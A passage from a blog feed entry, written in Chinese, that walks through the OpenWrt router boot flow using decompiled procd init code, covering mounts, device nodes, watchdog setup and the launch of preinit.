  </entry>
  
  <entry>
    <title>openwrt路由器启动流程</title>
    <link href="http://s1nec-1o.github.io/2025/01/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/"/>
    <id>http://s1nec-1o.github.io/2025/01/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/</id>
    <published>2025-01-04T05:20:30.000Z</published>
    <updated>2025-01-04T05:49:33.928Z</updated>
    
    <content type="html"><![CDATA[<h1 id="openwrt路由器启动流程"><a href="#openwrt路由器启动流程" class="headerlink" title="openwrt路由器启动流程"></a>openwrt路由器启动流程</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>只做了大致流程的分析</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过&#x2F;etc&#x2F;rc.d下的链接执行**&#x2F;etc&#x2F;init.d**下的初始化服务，不过有的固件并没有init.d目录，因此还是得特殊情况特殊看待</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><strong>&#x2F;sbin&#x2F;init-&gt;第一次&#x2F;sbin&#x2F;procd-&gt;&#x2F;sbin&#x2F;preinit-&gt;第二次&#x2F;sbin&#x2F;procd</strong></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h2 id="sbin-init"><a href="#sbin-init" class="headerlink" title="&#x2F;sbin&#x2F;init"></a>&#x2F;sbin&#x2F;init</h2><p>首先第一个启动的程序便是&#x2F;sbin&#x2F;init初始化程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sigaction</span>(<span class="number">15</span>, &amp;asc_1244C, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(<span class="number">10</span>, &amp;asc_1244C, <span class="number">0</span>);</span><br><span class="line">  v3 = <span class="built_in">sigaction</span>(<span class="number">12</span>, &amp;asc_1244C, <span class="number">0</span>);</span><br><span class="line">  v4 = <span class="built_in">sub_9110</span>(v3);</span><br><span class="line">  <span class="built_in">sub_903C</span>(v4);</span><br><span class="line">  v5 = <span class="built_in">sub_9C04</span>(<span class="number">1</span>);</span><br><span class="line">  v6 = <span class="built_in">uloop_init</span>(v5);</span><br><span class="line">  v7 = <span class="built_in">sub_94D0</span>(v6);</span><br><span class="line">  <span class="built_in">uloop_run</span>(v7);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sub-9110"><a href="#sub-9110" class="headerlink" title="sub_9110"></a>sub_9110</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_9110</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">stat</span> v2; <span class="comment">// [sp+8h] [bp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">getpid</span>();</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0x400</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;sysfs&quot;</span>, <span class="string">&quot;/sys&quot;</span>, <span class="string">&quot;sysfs&quot;</span>, <span class="number">0x400</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/tmp&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0x406</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/run&quot;</span>, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/lock&quot;</span>, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/state&quot;</span>, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="built_in">symlink</span>(<span class="string">&quot;/tmp&quot;</span>, <span class="string">&quot;/var&quot;</span>);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/dev&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0x400</span>u, <span class="string">&quot;mode=0755,size=512K&quot;</span>);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/shm&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0x400</span>u, <span class="string">&quot;mode=600&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_98F0</span>(<span class="string">&quot;*&quot;</span>, <span class="number">384</span>);</span><br><span class="line">    <span class="built_in">mknod</span>(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">0x1B6</span>u, <span class="number">0x103</span>uLL);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;PATH&quot;</span>, <span class="string">&quot;/bin:/sbin:/usr/bin:/usr/sbin&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">stat</span>(<span class="string">&quot;/dev/console&quot;</span>, &amp;v2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to stat %s\n&quot;</span>, <span class="string">&quot;/dev/console&quot;</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Failed to stat %s\n&quot;</span>, <span class="string">&quot;/dev/console&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="built_in">open</span>(<span class="string">&quot;/dev/console&quot;</span>, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">        v1 = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">dup2</span>(v1, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">dup2</span>(v1, <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">dup2</span>(v1, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt; <span class="number">2</span> )</span><br><span class="line">        <span class="built_in">close</span>(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Console is alive\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fputs</span>(<span class="string">&quot;procd: Console is alive\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到要求当前程序的pid为1，在仿真时，或许可以直接把其patch掉，挂载多个文件系统，创建目录和符号链接，设置模式，大小和权限，之后调用sub_98F0函数</p><h4 id="sub-98F0"><a href="#sub-98F0" class="headerlink" title="sub_98F0"></a>sub_98F0</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_98F0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// r0</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// r4</span></span><br><span class="line">  _DWORD v8[<span class="number">7</span>]; <span class="comment">// [sp+4h] [bp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">0</span>] = a2;                                   <span class="comment">// 0x180</span></span><br><span class="line">  v8[<span class="number">1</span>] = a3;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">chdir</span>(<span class="string">&quot;/dev&quot;</span>) )                          <span class="comment">// 设置当前工作目录为/dev，失败返回1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(a1);                              <span class="comment">// *</span></span><br><span class="line">  v7 = <span class="built_in">malloc</span>(v6 + <span class="number">2</span>);</span><br><span class="line">  *v7 = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v7 + <span class="number">1</span>, a1);</span><br><span class="line">  v8[<span class="number">0</span>] = v7;                                   <span class="comment">// &amp;(**)</span></span><br><span class="line">  addrxx = (<span class="type">int</span>)v8;</span><br><span class="line">  dword_144A4 = <span class="number">1</span>;</span><br><span class="line">  dword_12460 = a2;</span><br><span class="line">  <span class="built_in">sub_9688</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sub_9688</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的sub_9688函数，是为了遍历指定目录，读取符号链接，匹配特定模式，并创建相应的设备节点。</p><ol><li><strong>参数为 0：</strong><ul><li>路径为 <code>/sys/dev/char</code>。</li><li>创建字符设备节点（<code>v14 = 0x2000</code>）。</li></ul></li><li><strong>参数为 1：</strong><ul><li>路径为 <code>&quot;/sys/dev/block&quot;</code>。</li><li>创建块设备节点（<code>v14 = 24576</code>，即 <code>0x6000</code>）。</li></ul></li></ol><h3 id="sub-903C"><a href="#sub-903C" class="headerlink" title="sub_903C"></a>sub_903C</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sub_903C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1016</span>]; <span class="comment">// [sp+8h] [bp-440h] BYREF</span></span><br><span class="line">  <span class="type">regex_t</span> v3; <span class="comment">// [sp+408h] [bp-40h] BYREF</span></span><br><span class="line">  <span class="type">regmatch_t</span> v4; <span class="comment">// [sp+428h] [bp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+430h] [bp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+434h] [bp-14h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">open</span>(<span class="string">&quot;/proc/cmdline&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf[<span class="built_in">read</span>(v0, buf, <span class="number">0x3FF</span>u)] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">close</span>(v1);</span><br><span class="line">    <span class="built_in">regcomp</span>(&amp;v3, <span class="string">&quot;init_debug=([0-9]+)&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">regexec</span>(&amp;v3, buf, <span class="number">2u</span>, &amp;v4, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      buf[v6] = <span class="number">0</span>;</span><br><span class="line">      dword_12474 = <span class="built_in">atoi</span>(&amp;buf[v5]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">regfree</span>(&amp;v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此函数的作用是解析内核命令行参数，提取 <code>init_debug</code> 的值，并将其存储在全局变量 <code>dword_12474</code> 中</p><h3 id="sub-9C04"><a href="#sub-9C04" class="headerlink" title="sub_9C04"></a>sub_9C04</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title">sub_9C04</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  FILE *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">getenv</span>(<span class="string">&quot;WDTFD&quot;</span>);</span><br><span class="line">  v3 = result;</span><br><span class="line">  <span class="keyword">if</span> ( dword_12464 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_144B4 = (<span class="type">int</span>)sub_9980;</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Watchdog handover: fd=%s\n&quot;</span>, result);</span><br><span class="line">        <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Watchdog handover: fd=%s\n&quot;</span>, <span class="string">&quot;watchdog_init&quot;</span>, <span class="number">103</span>, v3);</span><br><span class="line">      &#125;</span><br><span class="line">      dword_12464 = <span class="built_in">atoi</span>(v3);</span><br><span class="line">      result = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">unsetenv</span>(<span class="string">&quot;WDTFD&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      dword_12464 = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = dword_12464;</span><br><span class="line">    <span class="keyword">if</span> ( dword_12464 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="built_in">fcntl</span>(dword_12464, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">fcntl</span>(v4, <span class="number">2</span>, v5 | <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- watchdog -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - watchdog -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_9A84</span>(<span class="number">30</span>);</span><br><span class="line">      result = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_9980</span>(&amp;unk_144A8);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="built_in">sub_9A84</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Opened watchdog with timeout %ds\n&quot;</span>, v6);</span><br><span class="line">        v7 = (FILE *)stderr;</span><br><span class="line">        v8 = <span class="built_in">sub_9A84</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">fprintf</span>(v7, <span class="string">&quot;procd: %s(%d): Opened watchdog with timeout %ds\n&quot;</span>, <span class="string">&quot;watchdog_init&quot;</span>, <span class="number">120</span>, v8);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化看门狗计时器</p><h3 id="sub-94D0"><a href="#sub-94D0" class="headerlink" title="sub_94D0"></a>sub_94D0</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_94D0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">__pid_t</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *file[<span class="number">4</span>]; <span class="comment">// [sp+Ch] [bp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v6[<span class="number">11</span>]; <span class="comment">// [sp+1Ch] [bp-2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="string">&quot;/etc/preinit&quot;</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  file[<span class="number">0</span>] = <span class="string">&quot;/sbin/procd&quot;</span>;</span><br><span class="line">  file[<span class="number">1</span>] = <span class="string">&quot;-h&quot;</span>;</span><br><span class="line">  file[<span class="number">2</span>] = <span class="string">&quot;/etc/hotplug-preinit.json&quot;</span>;</span><br><span class="line">  file[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- preinit -\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fputs</span>(<span class="string">&quot;procd: - preinit -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">  dword_12484 = (<span class="type">int</span>)sub_9344;</span><br><span class="line">  v0 = fork();</span><br><span class="line">  dword_12488 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )                                    <span class="comment">// 子</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">execvp</span>(file[<span class="number">0</span>], file);</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start plugd\n&quot;</span>);</span><br><span class="line">    v1 = &amp;byte_9F8F;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start new plugd instance\n&quot;</span>);</span><br><span class="line">    v2 = byte_9FAD;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fputs</span>(v2, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">uloop_process_add</span>(&amp;unk_12478);</span><br><span class="line">  <span class="built_in">setenv</span>(<span class="string">&quot;PREINIT&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  dword_12498 = (<span class="type">int</span>)sub_9350;</span><br><span class="line">  v3 = fork();</span><br><span class="line">  dword_1249C = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">execvp</span>(v6[<span class="number">0</span>], v6);</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start preinit\n&quot;</span>);</span><br><span class="line">    v1 = <span class="string">&quot;procd: Failed to start preinit\n&quot;</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">fputs</span>(v1, (FILE *)stderr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start new preinit instance\n&quot;</span>);</span><br><span class="line">    v2 = <span class="string">&quot;procd: Failed to start new preinit instance\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fputs</span>(v2, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="built_in">uloop_process_add</span>(&amp;unk_1248C);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Launched preinit instance, pid=%d\n&quot;</span>, dword_1249C);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Launched preinit instance, pid=%d\n&quot;</span>, <span class="string">&quot;preinit&quot;</span>, <span class="number">120</span>, dword_1249C);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先fork运行&#x2F;sbin&#x2F;procd，以-h &#x2F;etc&#x2F;hotplug-preinit.json作为参数，之后uloop_process_add(&amp;unk_12478);， setenv(“PREINIT”, “1”, 1);设置preinit为1作为flag，之后fork运行&#x2F;bin&#x2F;sh，以&#x2F;etc&#x2F;preinit作为参数</p><blockquote><p><code>execvp</code> 会加载新的程序到当前进程的地址空间，覆盖原有的代码、数据和堆栈，因此紧跟execvp后面的便是错误的输出</p></blockquote><blockquote><p>uloop_process 是 Libubox 提供的一个进程管理工具,它并不会帮你创建进程，它主要用来等待子进程工作的结束，然后调用自定义的回调函数，所以一般需要配合 <code>fork</code>一起使用。</p></blockquote><p>这里注意观察两个地方</p><p>uloop_process_add(&amp;dword_12478);和result &#x3D; uloop_process_add(&amp;dword_1248C);，其实这个add的是结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">uloop_process</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">list_head</span> list;</span><br><span class="line"><span class="type">bool</span> pending;</span><br><span class="line">uloop_process_handler cb;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>实际调用的函数是cb，而list_head一般包括pre和next两个指针占用8个字节，pending由于对齐占用4个字节</p><p>因此之后main函数运行uloop_run(v1);这个时，调用的分别是sub_9344和sub_9350函数，但是首先来看之后运行的&#x2F;sbin&#x2F;procd和&#x2F;etc&#x2F;preinit</p><h3 id="sbin-procd"><a href="#sbin-procd" class="headerlink" 